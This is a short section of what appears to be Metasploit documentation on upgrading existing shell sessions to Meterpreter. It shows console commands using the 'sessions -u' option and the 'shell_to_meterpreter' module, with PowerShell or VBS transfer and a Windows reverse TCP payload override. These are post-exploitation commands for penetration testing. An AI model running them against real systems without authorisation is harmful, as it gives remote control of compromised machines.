## Upgrading shells to Meterpreter

If you have an existing session, either Meterpreter, an SSH, or a basic command shell - you can open a new Meterpreter session with:

```
sessions -u 3
```

To upgrade the most recently opened session to Meterpreter using the `sessions` command:

```
sessions -u -1
```

Or run the `shell_to_meterpreter` module manually:

```
use multi/manage/shell_to_meterpreter
run session=-1
run session=-1 win_transfer=POWERSHELL
run session=-1 win_transfer=VBS
```

If you want to upgrade your shell with fine control over what payload, use the `PAYLOAD_OVERRIDE`, `PLATFORM_OVERRIDE`, and on windows, `PSH_ARCH_OVERRIDE`. All 3 options are required to set an override on windows, and the first two options are required on other platforms, unless you are not using an override.

```
use multi/manage/shell_to_meterpreter
set SESSION 1
set PAYLOAD_OVERRIDE windows/meterpreter/reverse_tcp
set PLATFORM_OVERRIDE windows
set PSH_ARCH_OVERRIDE x64
```
